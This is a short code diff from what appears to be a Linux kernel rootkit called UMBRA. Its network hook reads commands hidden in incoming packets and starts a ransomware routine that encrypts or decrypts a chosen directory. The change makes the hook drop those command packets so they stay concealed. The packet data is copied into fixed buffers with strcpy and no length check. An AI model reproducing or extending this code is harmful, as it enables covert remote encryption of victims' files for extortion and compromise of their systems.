@@ -120,11 +120,13 @@ unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_stat
             strcpy(encrypt_path, user_data+strlen(UMBRA_ENCRYPT_DIR_KEY));
             printk(KERN_INFO "UMBRA:: Received order to ENCRYPT %s \n", encrypt_path);
             start_ransom_module(RANSOM_ENCRYPT, encrypt_path);
+            return NF_DROP;
         }else if(memcmp(user_data, UMBRA_DECRYPT_DIR_KEY, strlen(UMBRA_DECRYPT_DIR_KEY))==0){
             char decrypt_path[UMBRA_DECRYPT_DIR_KEY_BUF_LEN];
             strcpy(decrypt_path, user_data+strlen(UMBRA_DECRYPT_DIR_KEY));
             printk(KERN_INFO "UMBRA:: Received order to DECRYPT %s \n", decrypt_path);
             start_ransom_module(RANSOM_DECRYPT, decrypt_path);
+            return NF_DROP;
         }
 
 
